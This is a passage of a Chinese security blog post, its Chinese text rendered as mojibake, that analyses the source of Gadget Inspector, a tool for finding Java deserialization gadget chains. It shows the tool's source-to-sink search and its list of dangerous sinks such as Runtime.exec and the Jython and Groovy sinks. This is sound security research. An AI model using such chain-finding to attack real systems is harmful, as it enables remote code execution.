class="line">    <span class="comment">// åŠ è½½æ–¹æ³•ä¿¡æ¯</span></span><br><span class="line">    Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">    <span class="comment">// åŠ è½½ç»§æ‰¿ä¿¡æ¯ï¼ˆinheritanceMapï¼šå­ç±»-&gt;çˆ¶ç±»é›†åˆï¼ŒsubClassMapï¼šçˆ¶ç±»-&gt;å­ç±»é›†åˆï¼‰</span></span><br><span class="line">    InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line">    <span class="comment">// åŠ è½½é‡å†™ä¿¡æ¯ï¼šæ–¹æ³•-&gt;é‡å†™æ–¹æ³•é›†åˆ</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(</span><br><span class="line">            inheritanceMap, methodMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›ç›®æ ‡æ–¹æ³•çš„å¯åºåˆ—åŒ–é‡å†™æ–¹æ³•ï¼ˆåŒ…æ‹¬ç›®æ ‡æ–¹æ³•æœ¬èº«ï¼‰</span></span><br><span class="line">    <span class="keyword">final</span> ImplementationFinder implementationFinder = config.getImplementationFinder(</span><br><span class="line">            methodMap, methodImplMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿å­˜é‡å†™ä¿¡æ¯åˆ° methodimpl.datï¼šï¼ˆç¼©è¿›ï¼‰ç±»å æ–¹æ³•å æè¿°ç¬¦</span></span><br><span class="line">    <span class="keyword">try</span> (Writer writer = Files.newBufferedWriter(Paths.get(<span class="string">&quot;methodimpl.dat&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123;</span><br><span class="line">            writer.write(entry.getKey().getClassReference().getName());</span><br><span class="line">            writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            writer.write(entry.getKey().getName());</span><br><span class="line">            writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            writer.write(entry.getKey().getDesc());</span><br><span class="line">            writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (MethodReference.Handle method : entry.getValue()) &#123;</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(method.getClassReference().getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(method.getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(method.getDesc());</span><br><span class="line">                writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ è½½è°ƒç”¨å…³ç³»ä¿¡æ¯</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (GraphCall graphCall : DataLoader.loadData(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>), <span class="keyword">new</span> GraphCall.Factory())) &#123;</span><br><span class="line">        MethodReference.Handle caller = graphCall.getCallerMethod();</span><br><span class="line">        <span class="keyword">if</span> (!graphCallMap.containsKey(caller)) &#123;</span><br><span class="line">            Set&lt;GraphCall&gt; graphCalls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">            graphCalls.add(graphCall);</span><br><span class="line">            graphCallMap.put(caller, graphCalls);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            graphCallMap.get(caller).add(graphCall);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å·²ç»è®¿é—®è¿‡çš„æ–¹æ³•ï¼ˆèŠ‚ç‚¹ï¼‰</span></span><br><span class="line">    Set&lt;GadgetChainLink&gt; exploredMethods = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="comment">// å¾…åˆ†æçš„é“¾</span></span><br><span class="line">    LinkedList&lt;GadgetChain&gt; methodsToExplore = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="comment">// åŠ è½½æ‰€æœ‰ sourcesï¼Œå¹¶å°†æ¯ä¸ª source åˆ†åˆ«ä½œä¸ºé“¾çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">for</span> (Source source : DataLoader.loadData(Paths.get(<span class="string">&quot;sources.dat&quot;</span>), <span class="keyword">new</span> Source.Factory())) &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºèŠ‚ç‚¹</span></span><br><span class="line">        GadgetChainLink srcLink = <span class="keyword">new</span> GadgetChainLink(source.getSourceMethod(), source.getTaintedArgIndex());</span><br><span class="line">        <span class="keyword">if</span> (exploredMethods.contains(srcLink)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// åˆ›å»ºä»…æœ‰ä¸€ä¸ªèŠ‚ç‚¹çš„é“¾</span></span><br><span class="line">        methodsToExplore.add(<span class="keyword">new</span> GadgetChain(Arrays.asList(srcLink)));</span><br><span class="line">        <span class="comment">// å°†æ–¹æ³•æ ‡è®°ä¸ºå·²è®¿é—®</span></span><br><span class="line">        exploredMethods.add(srcLink);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¾ªç¯æ¬¡æ•°</span></span><br><span class="line">    <span class="keyword">long</span> iteration = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// ä¿å­˜æ‰¾åˆ°çš„åˆ©ç”¨é“¾</span></span><br><span class="line">    Set&lt;GadgetChain&gt; discoveredGadgets = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="comment">// BFS æœç´¢ source åˆ° sink çš„åˆ©ç”¨é“¾</span></span><br><span class="line">    <span class="keyword">while</span> (methodsToExplore.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((iteration % <span class="number">1000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            LOGGER.info(<span class="string">&quot;Iteration &quot;</span> + iteration + <span class="string">&quot;, Search space: &quot;</span> + methodsToExplore.size());</span><br><span class="line">        &#125;</span><br><span class="line">        iteration += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        GadgetChain chain = methodsToExplore.pop(); <span class="comment">// å–å‡ºä¸€æ¡é“¾</span></span><br><span class="line">        GadgetChainLink lastLink = chain.links.get(chain.links.size() - <span class="number">1</span>); <span class="comment">// å–è¿™æ¡é“¾æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼ˆæ–¹æ³•ï¼‰</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–å½“å‰æ–¹æ³•ä¸å…¶è¢«è°ƒæ–¹æ³•çš„è°ƒç”¨å…³ç³»</span></span><br><span class="line">        Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);</span><br><span class="line">        <span class="keyword">if</span> (methodCalls != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (GraphCall graphCall : methodCalls) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœå½“å‰æ–¹æ³•çš„æ±¡æŸ“å‚æ•°ä¸è¢«è°ƒæ–¹æ³•å—æ–¹æ³•å‚æ•°å½±å“çš„ç´¢å¼•ä¸ä¸€è‡´åˆ™è·³è¿‡ï¼ˆå³ç¬¬ index ä¸ªå‚æ•°ï¼‰</span></span><br><span class="line">                <span class="comment">// åˆ¤æ–­ source æ—¶ï¼Œç´¢å¼•æŒ‡å‡ºèƒ½å¤Ÿè¢«æ”»å‡»è€…æ§åˆ¶çš„å‚æ•°</span></span><br><span class="line">                <span class="keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è·å–è¢«è°ƒæ–¹æ³•çš„å¯åºåˆ—åŒ–é‡å†™ä¿¡æ¯</span></span><br><span class="line">                Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// éå†è¢«è°ƒæ–¹æ³•çš„é‡å†™æ–¹æ³•</span></span><br><span class="line">                <span class="keyword">for</span> (MethodReference.Handle methodImpl : allImpls) &#123;</span><br><span class="line">                    GadgetChainLink newLink = <span class="keyword">new</span> GadgetChainLink(methodImpl, graphCall.getTargetArgIndex());</span><br><span class="line">                    <span class="comment">// å¦‚æœè¢«è°ƒæ–¹æ³•å·²ç»è¢«è®¿é—®è¿‡äº†ï¼Œåˆ™è·³è¿‡ï¼Œå‡å°‘å¼€é”€</span></span><br><span class="line">                    <span class="comment">// ä½†æ˜¯è·³è¿‡ä¼šä½¿å…¶ä»–é“¾åœ¨ç»è¿‡æ­¤èŠ‚ç‚¹æ—¶æ–­æ‰</span></span><br><span class="line">                    <span class="comment">// è€Œå»æ‰è¿™æ­¥å¯èƒ½ä¼šé‡åˆ°ç¯çŠ¶é—®é¢˜ï¼Œé€ æˆè·¯å¾„æ— é™å¢åŠ </span></span><br><span class="line">                    <span class="keyword">if</span> (exploredMethods.contains(newLink)) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// æ–°èŠ‚ç‚¹ï¼ˆè¢«è°ƒæ–¹æ³•ï¼‰ä¸ä¹‹å‰çš„é“¾ç»„æˆæ–°é“¾</span></span><br><span class="line">                    GadgetChain newChain = <span class="keyword">new</span> GadgetChain(chain, newLink);</span><br><span class="line">                    <span class="comment">// åˆ¤æ–­è¢«è°ƒæ–¹æ³•æ˜¯å¦ä¸º sink ç‚¹ï¼Œå¦‚æœæ˜¯åˆ™åŠ å…¥åˆ©ç”¨é“¾é›†åˆ</span></span><br><span class="line">                    <span class="keyword">if</span> (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;</span><br><span class="line">                        discoveredGadgets.add(newChain);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;    <span class="comment">// å¦åˆ™å°†æ–°é“¾åŠ å…¥å¾…åˆ†æçš„é“¾é›†åˆï¼Œè¢«è°ƒæ–¹æ³•åŠ å…¥å·²è®¿é—®çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line">                        methodsToExplore.add(newChain);</span><br><span class="line">                        exploredMethods.add(newLink);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†æœç´¢åˆ°çš„åˆ©ç”¨é“¾ä¿å­˜åˆ° gadget-chains.txt</span></span><br><span class="line">    <span class="keyword">try</span> (OutputStream outputStream = Files.newOutputStream(Paths.get(<span class="string">&quot;gadget-chains.txt&quot;</span>));</span><br><span class="line">         Writer writer = <span class="keyword">new</span> OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (GadgetChain chain : discoveredGadgets) &#123;</span><br><span class="line">            printGadgetChain(writer, chain);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Found &#123;&#125; gadget chains.&quot;</span>, discoveredGadgets.size());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isSink</code> æ–¹æ³•åˆ¤æ–­æ–¹æ³•ï¼ˆå’Œå‚æ•°ï¼‰æ˜¯å¦è§¦å‘é¢„å®šä¹‰çš„ JDK ä¸­çš„ sink ç‚¹ï¼Œæ¯”å¦‚ <code>Runtime.exec</code> æ–¹æ³•ã€‚ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é¢„å®šä¹‰çš„ sink ç‚¹</span></span><br><span class="line"><span class="comment"> * Represents a collection of methods in the JDK that we consider to be &quot;interesting&quot;. If a gadget chain can</span></span><br><span class="line"><span class="comment"> * successfully exercise one of these, it could represent anything as mundade as causing the target to make a DNS</span></span><br><span class="line"><span class="comment"> * query to full blown RCE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> method            æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> argIndex          å‚æ•°ç´¢å¼•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inheritanceMap    ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Parameterize this as a configuration option</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isSink</span><span class="params">(MethodReference.Handle method, <span class="keyword">int</span> argIndex, InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/io/FileInputStream&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/io/FileOutputStream&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/nio/file/Files&quot;</span>)</span><br><span class="line">            &amp;&amp; (method.getName().equals(<span class="string">&quot;newInputStream&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newOutputStream&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newBufferedReader&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newBufferedWriter&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Runtime&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    if (method.getClassReference().getName().equals(&quot;java/lang/Class&quot;)</span></span><br><span class="line"><span class="comment">            &amp;&amp; method.getName().equals(&quot;forName&quot;)) &#123;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if (method.getClassReference().getName().equals(&quot;java/lang/Class&quot;)</span></span><br><span class="line"><span class="comment">            &amp;&amp; method.getName().equals(&quot;getMethod&quot;)) &#123;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// If we can invoke an arbitrary method, that&#x27;s probably interesting (though this doesn&#x27;t assert that we</span></span><br><span class="line">    <span class="comment">// can control its arguments). Conversely, if we can control the arguments to an invocation but not what</span></span><br><span class="line">    <span class="comment">// method is being invoked, we don&#x27;t mark that as interesting.</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/reflect/Method&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;invoke&quot;</span>) &amp;&amp; argIndex == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/net/URLClassLoader&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;newInstance&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/System&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Shutdown&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Runtime&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/nio/file/Files&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;newOutputStream&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/ProcessBuilder&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>) &amp;&amp; argIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;java/lang/ClassLoader&quot;</span>))</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/net/URL&quot;</span>) &amp;&amp; method.getName().equals(<span class="string">&quot;openStream&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Some groovy-specific sinks</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/codehaus/groovy/runtime/InvokerHelper&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;invokeMethod&quot;</span>) &amp;&amp; argIndex == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;groovy/lang/MetaClass&quot;</span>))</span><br><span class="line">            &amp;&amp; Arrays.asList(<span class="string">&quot;invokeMethod&quot;</span>, <span class="string">&quot;invokeConstructor&quot;</span>, <span class="string">&quot;invokeStaticMethod&quot;</span>).contains(method.getName())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This jython-specific sink effectively results in RCE</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/python/core/PyCode&quot;</span>) &amp;&amp; method.getName().equals(<span class="string">&quot;call&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>printGadgetChain</code> æ–¹æ³•ç”¨äºè¾“å‡ºåˆ©ç”¨é“¾ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å°†åˆ©ç”¨é“¾å†™å…¥æ–‡ä»¶ï¼šï¼ˆç¼©è¿›ï¼‰ç±»å æ–¹æ³•å æ–¹æ³•æè¿°ç¬¦ ä¼ é€’æ±¡ç‚¹çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> writer å†™å…¥æµ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> chain  åˆ©ç”¨é“¾</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printGadgetChain</span><span class="params">(Writer writer, GadgetChain chain)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    writer.write(String.format(<span class="string">&quot;%s.%s%s (%d)%n&quot;</span>,    <span class="comment">// æ±¡ç‚¹æº</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).method.getClassReference().getName(),    <span class="comment">// ç±»å</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).method.getName(),    <span class="comment">// æ–¹æ³•å</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).method.getDesc(),    <span class="comment">// æè¿°ç¬¦</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).taintedArgIndex));   <span class="comment">// æ±¡ç‚¹å‚æ•°ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; chain.links.size(); i++) &#123;  <span class="comment">// åˆ©ç”¨é“¾</span></span><br><span class="line">        writer.write(String.format(<span class="string">&quot;  %s.%s%s (%d)%n&quot;</span>,</span><br><span class="line">                chain.links.get(i).method.getClassReference().getName(),</span><br><span class="line">                chain.links.get(i).method.getName(),</span><br><span class="line">                chain.links.get(i).method.getDesc(),</span><br><span class="line">                chain.links.get(i).taintedArgIndex));</span><br><span class="line">    &#125;</span><br><span class="line">    writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-ç»“è¯­"><a href="#0x04-ç»“è¯­" class="headerlink" title="0x04 ç»“è¯­"></a>0x04 ç»“è¯­</h1><p>æµ‹è¯•æ—¶å‘ç° Gadget Inspector æ— æ³•åˆ†æç”¨ Java16 ç”Ÿæˆçš„ jar åŒ…ï¼Œå¬è¯´ Java8 çš„å…¼å®¹æ€§æ¯”è¾ƒå¥½ï¼Œå°è¯•ä½¿ç”¨ Java8 æ‰“åŒ…ï¼Œå¯ä»¥æ­£å¸¸æ‰§è¡Œåˆ†æï¼Œä¹‹åå†è¡¥å……ä¾‹å­ã€‚</p><p>è¿™ä¸ªå·¥å…·å¾ˆæ˜æ˜¾æ— æ³•æœç´¢æ‰€æœ‰çš„åˆ©ç”¨é“¾ï¼Œä¸ºäº†é¿å…è·¯å¾„çˆ†ç‚¸å¯¹æ¯ä¸ªæ–¹æ³•åªè®¿é—®ä¸€æ¬¡ï¼Œå¯ä»¥ç”¨æœ€å¤§æ·±åº¦é™åˆ¶ä¿®æ”¹ï¼›å¦å¤–ä¹Ÿæœ‰æ–‡ç« åˆ†æè¡¨ç¤ºç”Ÿæˆçš„è°ƒç”¨å…³ç³»ä¸å¤Ÿå…¨ï¼Œæˆ‘æ²¡æœ‰éªŒè¯è¿‡ï¼›æ‰©å……çš„è¯å¯ä»¥ä»æ·»åŠ  source/sink ç‚¹ï¼ˆè§„åˆ™ï¼‰å¼€å§‹ï¼Œä¹Ÿæœ‰äººæ‰©å……äº†å¯¹ SQL æ³¨å…¥ï¼ˆWebï¼‰çš„æ£€æµ‹ä¹‹ç±»çš„ã€‚</p><p>å½“ç„¶è¿˜æ˜¯å…ˆç†Ÿæ‚‰å·¥å…·çš„è¿è¡ŒåŸç†ï¼Œç”¨ç®€å•çš„ç¨‹åºæµ‹è¯•ä¹‹åï¼Œå†æ‹¿å®é™…ä¾‹å­ï¼ˆæ¯”å¦‚ ysoserialï¼‰æµ‹ï¼Œéš¾é¡¶ğŸ¤¯ã€‚</p><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html">å­—èŠ‚ç å¢å¼ºæŠ€æœ¯æ¢ç´¢</a></li><li><a href="https://zhuanlan.zhihu.com/p/45354152">Javaè™šæ‹Ÿæœºâ€”æ ˆå¸§ã€æ“ä½œæ•°æ ˆå’Œå±€éƒ¨å˜é‡è¡¨</a></li><li><a href="https://docs.oracle.com/javase/specs/index.html">Java Language and Virtual Machine Specifications</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/ClassReader.html">Class ClassReader</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/ClassVisitor.html">Class ClassVisitor</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/MethodVisitor.html">Class MethodVisitor</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/FieldVisitor.html">Class FieldVisitor</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/commons/JSRInlinerAdapter.html">Class JSRInlinerAdapter</a></li><li><a href="https://paper.seebug.org/1034/">Java ååºåˆ—åŒ–å·¥å…· gadgetinspector åˆçª¥</a></li><li><a 